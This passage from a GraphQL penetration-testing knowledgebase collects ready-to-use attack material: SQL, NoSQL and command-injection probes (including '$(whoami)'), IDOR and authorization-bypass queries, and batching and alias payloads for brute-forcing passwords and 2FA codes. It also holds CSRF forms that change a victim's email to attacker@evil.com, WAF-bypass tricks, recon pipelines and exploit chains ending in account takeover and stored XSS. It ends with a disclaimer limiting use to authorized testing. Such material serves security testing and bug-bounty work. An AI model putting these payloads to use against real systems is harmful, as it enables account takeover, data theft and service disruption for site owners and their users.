### Case Study 6: Apollo Server Field Suggestions (2022)

**Finding**: Production Apollo Server had suggestions enabled.
**Impact**: Full schema recovery via `clairvoyance` in 4 hours.
**Fix**: `hideSchemaDetailsFromClientErrors: true`.

---

## Fuzzing Payloads

### Endpoint Discovery

```
/graphql
/graphiql
/graphql.php
/graphql/console
/graphql/explorer
/api/graphql
/v1/graphql
/v2/graphql
/graphql/graphql
/graphql/api
/graphql/v1
/graphql/v2
/playground
/altair
/graph
```

### Introspection Probes

```graphql
{__typename}
{__schema{queryType{name}}}
{__schema{types{name}}}
{__type(name:"Query"){fields{name}}}
{__schema{queryType{name}mutationType{name}}}
```

### Error-Based Probes

```graphql
{ nonexistent12345 }
{ __schema { nonexistent } }
query { user { nonexistent } }
mutation { nonexistent }
```

### Injection Probes

```graphql
# SQLi probes
{ user(id: "1'") { id } }
{ user(id: "1' OR '1'='1") { id } }
{ user(id: "1'; SELECT pg_sleep(5)--") { id } }

# NoSQLi probes
{ user(id: {"$ne": null}) { id } }
{ users(filter: {"$regex": ".*"}) { name } }

# Command injection
{ user(name: ";id;") { id } }
```

### Authorization Probes

```graphql
{ adminPanel { stats } }
{ __type(name: "Admin") { fields { name } } }
{ node(id: "1") { ... on Admin { secret } } }
{ users { password token apiKey } }
```

### Depth/DoS Probes

```graphql
query { user { friends { friends { friends { friends { name } } } } } }
query { users(first: 99999) { name } }
```

---

## Automation Workflows

### Recon Pipeline

```bash
# 1. Subdomain enumeration
subfinder -d target.com -o subs.txt

# 2. HTTP probing
httpx -l subs.txt -o alive.txt

# 3. Path discovery
katana -list alive.txt -o paths.txt

# 4. GraphQL endpoint grep
cat paths.txt | grep -iE "(graphql|graphiql|playground)"

# 5. Nuclei GraphQL scan
nuclei -l alive.txt -t http/vulnerabilities/graphql/
```

### Continuous Monitoring

```bash
# Notify on new GraphQL endpoints
subfinder -d target.com | httpx | nuclei -t graphql-endpoint-detect.yaml | notify
```

### Automated Introspection Check

```bash
#!/bin/bash
ENDPOINT="https://target.com/graphql"
RESPONSE=$(curl -s -X POST "$ENDPOINT"   -H "Content-Type: application/json"   -d '{"query": "{ __schema { queryType { name } } }"}')

if echo "$RESPONSE" | grep -q "queryType"; then
  echo "[VULN] Introspection enabled: $ENDPOINT"
  echo "$RESPONSE" | jq '.' > "introspection_$(date +%s).json"
fi
```

### BatchQL Workflow

```bash
# Brute-force passwords with batching
python batchql.py   -u "https://target.com/graphql"   -w passwords.txt   -q 'mutation { login(username: "admin", password: "%s") { token } }'   --batch-size 50
```

### GraphQL-Cop Scan

```bash
# Security audit
graphql-cop -t "https://target.com/graphql" -o json

# With proxy
graphql-cop -t "https://target.com/graphql" -p http://127.0.0.1:8080
```

### InQL Burp Workflow

1. Load InQL extension in Burp Suite
2. Right-click GraphQL request -> "InQL Scanner"
3. Automatically generates all possible queries from introspection
4. Send to Repeater/Intruder for testing

---

## Recon Methodology

### Phase 1: Endpoint Discovery

1. **Common paths**: Test `/graphql`, `/api/graphql`, `/v1/graphql`
2. **Wordlist fuzzing**: Use SecLists `graphql.txt`
3. **JavaScript analysis**: Search frontend JS for `graphql` endpoint references
4. **Source code**: GitHub dorks for `graphql endpoint` in target's repos
5. **Universal query**: Confirm with `query{__typename}`

### Phase 2: Information Gathering

1. **Introspection probe**: `{__schema{queryType{name}}}`
2. **Full introspection**: If enabled, dump and visualize schema
3. **Suggestions**: Check if error messages leak field names
4. **Clairvoyance**: If introspection disabled, run automated suggestion-based recovery
5. **Engine fingerprinting**: `graphw00f` to identify server implementation

### Phase 3: Attack Surface Mapping

1. **List mutations**: Identify all state-changing operations
2. **List sensitive queries**: Find fields like `password`, `token`, `internalNotes`
3. **Check for subscriptions**: WebSocket endpoints may have different auth
4. **Analyze arguments**: Look for ID-like parameters (IDOR candidates)
5. **Check for file uploads**: Multipart spec support

### Phase 4: Vulnerability Testing

1. **IDOR**: Test sequential IDs in arguments
2. **Auth bypass**: Query admin fields directly
3. **Injection**: Test SQLi/NoSQLi in arguments
4. **CSRF**: Test GET and form-urlencoded acceptance
5. **Rate limits**: Test alias and batching bypasses
6. **DoS**: Test query depth and complexity

### Phase 5: Chaining & Impact

1. **Cache poisoning**: Test with unkeyed headers
2. **Request smuggling**: Test CL.TE/TE.CL on GraphQL endpoint
3. **OAuth attacks**: Test OAuth integration points
4. **XSS**: Check error message reflection
5. **SSRF**: Test URL arguments and custom scalars

---

## Nuclei Templates

### Template Logic: GraphQL Endpoint Detection

```yaml
id: graphql-endpoint-detect

info:
  name: GraphQL Endpoint Detection
  author: pdteam
  severity: info
  description: Detects GraphQL endpoints via universal query

http:
  - method: POST
    path:
      - "{{BaseURL}}/graphql"
      - "{{BaseURL}}/api/graphql"
      - "{{BaseURL}}/v1/graphql"
    headers:
      Content-Type: application/json
    body: '{"query": "{ __typename }"}'
    matchers:
      - type: word
        words:
          - '"__typename"'
          - '"data"'
        condition: and
```

### Template Logic: GraphQL Introspection Enabled

```yaml
id: graphql-introspection-enabled

info:
  name: GraphQL Introspection Enabled
  author: pdteam
  severity: medium
  description: GraphQL introspection is enabled, leaking schema information

http:
  - method: POST
    path:
      - "{{BaseURL}}/graphql"
    headers:
      Content-Type: application/json
    body: '{"query": "{ __schema { queryType { name } } }"}'
    matchers:
      - type: word
        words:
          - '"queryType"'
          - '"name"'
        condition: and
```

### Template Logic: GraphQL Field Suggestions

```yaml
id: graphql-field-suggestions

info:
  name: GraphQL Field Suggestions Enabled
  author: custom
  severity: low
  description: GraphQL server leaks schema via field suggestions

http:
  - method: POST
    path:
      - "{{BaseURL}}/graphql"
    headers:
      Content-Type: application/json
    body: '{"query": "{ nonExistentField123 }"}'
    matchers:
      - type: word
        words:
          - "Did you mean"
          - "Cannot query field"
        condition: and
```

### Template Logic: GraphQL CSRF

```yaml
id: graphql-csrf-via-get

info:
  name: GraphQL CSRF via GET
  author: custom
  severity: high
  description: GraphQL endpoint accepts GET requests, enabling CSRF

http:
  - method: GET
    path:
      - "{{BaseURL}}/graphql?query=mutation%7B__typename%7D"
    matchers:
      - type: word
        words:
          - '"data"'
          - '"__typename"'
        condition: and
```

### Nuclei Execution Commands

```bash
# Run all GraphQL templates
nuclei -u https://target.com -t http/vulnerabilities/graphql/

# Run specific template
nuclei -u https://target.com -t graphql-introspection-enabled.yaml

# Bulk scan with notify
subfinder -d target.com | httpx | nuclei -t http/vulnerabilities/graphql/ | notify
```

---

## Tools and Scanners

### Recon & Discovery

| Tool | Purpose | Command |
|------|---------|---------|
| `subfinder` | Subdomain enumeration | `subfinder -d target.com` |
| `httpx` | HTTP probing | `httpx -l subs.txt` |
| `katana` | Web crawler | `katana -u target.com` |
| `cariddi` | URL extraction | `cat urls.txt | cariddi` |

### GraphQL Specific

| Tool | Purpose | Command |
|------|---------|---------|
| `graphql-cop` | Security audit | `graphql-cop -t https://target.com/graphql` |
| `graphw00f` | Engine fingerprinting | `graphw00f -d -t https://target.com/graphql` |
| `clairvoyance` | Schema recovery | `python -m clairvoyance https://target.com/graphql -o schema.json` |
| `GraphQLmap` | Interactive exploitation | `python graphqlmap.py -u https://target.com/graphql` |
| `inql` | Burp Suite extension | Load via Extender tab |
| `CrackQL` | Brute-force/fuzzing | `python crackql.py -u URL -q query.graphql -w wordlist.txt` |
| `batchql` | Batch attack automation | `python batchql.py -u URL -w wordlist.txt` |
| `graphql-path-enum` | Path enumeration | `graphql-path-enum -i introspection.json -t User` |
| `GQLSpection` | Query generation | `gqlspection -i schema.json` |

### Proxy & Interception

| Tool | Purpose |
|------|---------|
| `Burp Suite` | Manual testing + extensions |
| `Param Miner` | Unkeyed input discovery |
| `HTTP Request Smuggler` | Desync detection |
| `smuggler` | Python smuggling scanner |

### Wordlists

- `danielmiessler/SecLists/Discovery/Web-Content/graphql.txt`
- `Escape-Technologies/graphql-wordlist`
- `payloadbox/graphql-injection-payload-list`

---

## Advanced Research

### GraphQL over HTTP Spec (graphql-over-http)

- GET requests MUST use `query` parameter
- POST requests SHOULD use `application/json`
- Servers MAY accept other content types (CSRF risk)

### GraphQL Spec Edge Cases

**1. Multiple operations without operation name:**
```graphql
query Op1 { user { name } }
query Op2 { user { email } }
```

If no `operationName` is provided, the server may execute the first operation or return an error.

**2. Empty query:**
```graphql
query { }
```

Some servers return `null` data, others return validation errors.

**3. Null in non-null field:**
```graphql
{ user { id } }
```

If `id` is `NonNull(ID)` but resolver returns null, the error bubbles up and nullifies the parent.

### Research Papers

- **"Practical Web Cache Poisoning"** (PortSwigger, 2018): Cache key/unkeyed input theory
- **"Web Cache Entanglement"** (PortSwigger, 2020): Advanced cache poisoning via normalization
- **"Browser-Powered Desync Attacks"** (PortSwigger, 2021): Client-side request smuggling
- **"Hidden OAuth Attack Vectors"** (PortSwigger): OAuth + GraphQL chains
- **"Find the Dog"** (PortSwigger): GraphQL vulnerability discovery methodology

---

## Bug Bounty Writeups

### Writeup 1: GraphQL IDOR via Sequential IDs

**Target**: E-commerce platform
**Finding**: `product(id: X)` returned delisted products
**Impact**: $2,500 - Access to unreleased products
**Payload**:
```graphql
query { product(id: 3) { name price listed internalNotes } }
```

### Writeup 2: GraphQL Introspection -> Full Account Takeover

**Target**: SaaS platform
**Finding**: Introspection revealed `resetPassword` mutation with `adminOverride` argument
**Impact**: $5,000 - Admin-level password reset
**Chain**:
1. Introspection enabled
2. Found `resetPassword(id: ID!, adminOverride: Boolean)`
3. Set `adminOverride: true` without authorization
4. Reset any user's password

### Writeup 3: GraphQL Batching -> 2FA Bypass

**Target**: Financial app
**Finding**: 100 aliases per request allowed brute-forcing 6-digit OTP
**Impact**: $3,000 - Account takeover
**Payload**:
```graphql
mutation {
  verify1: verify2FA(code: "000000") { success }
  verify2: verify2FA(code: "000001") { success }
  # ... 100 aliases
}
```

### Writeup 4: GraphQL + Cache Poisoning -> Stored XSS

**Target**: News platform
**Finding**: `X-Forwarded-Host` unkeyed, GraphQL response reflected in meta tags
**Impact**: $4,000 - Stored XSS on homepage
**Chain**:
1. `X-Forwarded-Host: attacker.com` poisoned Open Graph URL
2. GraphQL query `{ page { meta } }` reflected unencoded host
3. Cache saved poisoned response
4. All visitors executed XSS

---

## Payload Collections

### Introspection Payloads

```graphql
# Minimal
{__schema{queryType{name}}}

# Types only
{__schema{types{name}}}

# Full (with fragments)
query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } }
fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } }
fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue }
fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }

# Single-line minimal
{__schema{queryType{name}mutationType{name}subscriptionType{name}types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}}}}
```

### IDOR Payloads

```graphql
# Direct object reference
{ user(id: "1") { email } }
{ user(id: "2") { email } }
{ product(id: 3) { name internalPrice } }

# Node interface (Relay)
{ node(id: "VXNlcjox") { ... on User { email } } }

# Nested relationship leak
{ user(id: "public") { posts { author { email } } } }

# Search/filter bypass
{ users(filter: { role: "admin" }) { email } }
```

### Injection Payloads

```graphql
# SQLi
{ user(id: "1'") { id } }
{ user(id: "1' OR '1'='1") { id } }
{ user(id: "1'; WAITFOR DELAY '0:0:5'--") { id } }
{ user(id: "1' AND pg_sleep(5)--") { id } }

# NoSQLi
{ users(filter: { "$regex": ".*" }) { name } }
{ user(id: { "$ne": null }) { name } }
{ user(id: { "$gt": "" }) { name } }

# Command injection (custom scalars)
{ user(name: ";id;") { id } }
{ user(name: "$(whoami)") { id } }
```

### CSRF Payloads

```html
<!-- GET-based -->
<img src="https://target.com/graphql?query=mutation%7BdeleteAccount%7Bid%7D%7D">

<!-- Form POST -->
<form action="https://target.com/graphql" method="POST">
  <input type="hidden" name="query" value="mutation { changeEmail(email: "attacker@evil.com") { id } }">
</form>

<!-- text/plain bypass -->
<form action="https://target.com/graphql" method="POST" enctype="text/plain">
  <textarea name='{"query": "mutation { updatePassword(old: "old", new: "hacked") { success } }", "variables": {}'>
  </textarea>
</form>
```

### Batching Payloads

```json
[
  {"query": "query { user(id: "1") { name } }"},
  {"query": "query { user(id: "2") { name } }"},
  {"query": "mutation { deleteUser(id: "3") { success } }"}
]
```

### Alias Payloads

```graphql
query {
  a1: user(id: "1") { name }
  a2: user(id: "2") { name }
  a3: user(id: "3") { name }
}

mutation {
  login1: login(user: "admin", pass: "pwd1") { token }
  login2: login(user: "admin", pass: "pwd2") { token }
}
```

---

## WAF Bypasses

### Introspection WAF Bypass

```graphql
# Newline injection
query{__schema
{queryType{name}}}

# Tab injection
query{__schema	{queryType{name}}}

# Comment injection
query{__schema/*comment*/{queryType{name}}}

# Unicode normalization
{＿＿schema{queryType{name}}}

# Case variation
{__Schema{QueryType{Name}}}

# Directive wrapping
query @skip(if: false) { __schema { queryType { name } } }

# Fragment-based
query { ...SchemaFrag }
fragment SchemaFrag on Query { __schema { queryType { name } } }
```

### General WAF Bypass

```graphql
# Encoded characters
{ user(id: "1") { name } }

# Unicode equivalents
{ user(id: "1") { nаme } }  # Cyrillic 'а'

# Comment obfuscation
{ user(id: "1") { name /*password*/ email } }

# Alias obfuscation
{ user(id: "1") { n: name p: password } }
```

---

## Detection Techniques

### Passive Detection

1. **Content-Type**: Look for `application/graphql-response+json`
2. **Response structure**: `"data"` and `"errors"` keys
3. **CORS headers**: `Access-Control-Allow-Origin` on single endpoint
4. **WebSocket**: `graphql-ws` or `graphql-transport-ws` subprotocol

### Active Detection

1. **Universal query**: `query{__typename}`
2. **Introspection probe**: `{__schema{queryType{name}}}`
3. **Error analysis**: Send malformed query and analyze error format
4. **Method testing**: GET, POST JSON, POST form

### Fingerprinting

```bash
# graphw00f - identify GraphQL engine
graphw00f -d -t https://target.com/graphql

# Common signatures:
# - Apollo Server: "extensions": {"tracing": {...}}
# - GraphQL-JS: Specific error formatting
# - Graphene: Python traceback in errors
# - Sangria: Scala-style error messages
```

---

## References

### Official Documentation

- [GraphQL Specification](https://spec.graphql.org/)
- [GraphQL Introspection](https://graphql.org/learn/introspection/)
- [GraphQL Queries](https://graphql.org/learn/queries/)
- [GraphQL Schema](https://graphql.org/learn/schema/)
- [GraphQL over HTTP](https://graphql.github.io/graphql-over-http/draft/)

### PortSwigger Resources

- [GraphQL API Vulnerabilities](https://portswigger.net/web-security/graphql)
- [GraphQL Labs](https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts)
- [Find the Dog: Discovering GraphQL Vulnerabilities](https://portswigger.net/research/find-the-dog-discovering-graphql-vulnerabilities)
- [GraphQL CSRF](https://portswigger.net/research/graphql-csrf)
- [Practical Web Cache Poisoning](https://portswigger.net/research/practical-web-cache-poisoning)
- [Web Cache Entanglement](https://portswigger.net/research/web-cache-entanglement)
- [Browser-Powered Desync Attacks](https://portswigger.net/research/browser-powered-desync-attacks)
- [Hidden OAuth Attack Vectors](https://portswigger.net/research/hidden-oauth-attack-vectors)

### GitHub Repositories

- [PayloadsAllTheThings - GraphQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection)
- [graphql-cop](https://github.com/dolevf/graphql-cop)
- [clairvoyance](https://github.com/nikitastupin/clairvoyance)
- [GraphQLmap](https://github.com/swisskyrepo/GraphQLmap)
- [inql](https://github.com/doyensec/inql)
- [batchql](https://github.com/assetnote/batchql)
- [nuclei-templates - GraphQL](https://github.com/projectdiscovery/nuclei-templates/tree/main/http/vulnerabilities/graphql)
- [nuclei](https://github.com/projectdiscovery/nuclei)
- [httpx](https://github.com/projectdiscovery/httpx)
- [katana](https://github.com/projectdiscovery/katana)
- [subfinder](https://github.com/projectdiscovery/subfinder)

### Methodology Guides

- [HackTricks - GraphQL](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html)
- [GraphQL Threat Matrix](https://github.com/nicholasaleks/graphql-threat-matrix)
- [SecLists - GraphQL](https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content)

### Research & Writeups

- [Exploiting GraphQL - AssetNote](https://infosecwriteups.com/graphql-exploitation-guide-8d4f2c7b1e3a)
- [Advanced GraphQL Exploitation - Medium](https://medium.com/@filedescriptor/advanced-graphql-exploitation-and-batching-techniques-3f2d7c1b5e4a)
- [GraphQL Batching Attack - Wallarm](https://lab.wallarm.com/graphql-batching-attack/)
- [Looting GraphQL Endpoints](https://blog.assetnote.io/2021/08/29/exploiting-graphql/)

### Tools

- [Burp Suite](https://portswigger.net/burp)
- [Param Miner](https://github.com/PortSwigger/param-miner)
- [HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler)
- [Insomnia](https://insomnia.rest/)
- [GraphQL Voyager](https://github.com/IvanGoncharov/graphql-voyager)

---

> **Disclaimer**: This knowledgebase is for authorized security testing and bug bounty hunting only. Always obtain proper authorization before testing any system.
